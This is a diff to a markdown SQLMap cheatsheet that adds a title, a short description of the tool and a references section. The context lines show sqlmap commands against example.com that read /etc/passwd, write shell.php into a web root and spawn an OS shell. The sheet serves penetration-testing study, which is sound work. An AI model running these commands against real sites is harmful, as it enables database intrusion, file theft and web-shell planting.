@@ -1,4 +1,6 @@
-# SQLmap 
+# SQLMap Cheatsheet
+
+SQLMap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities.
 
 | **Command**                                                                                                               | **Description**                                             |
 | ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
@@ -27,3 +29,10 @@
 | `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
 | `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
+
+---
+
+## References
+
+- [SQLMap Official Documentation](https://sqlmap.org/)
+- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)
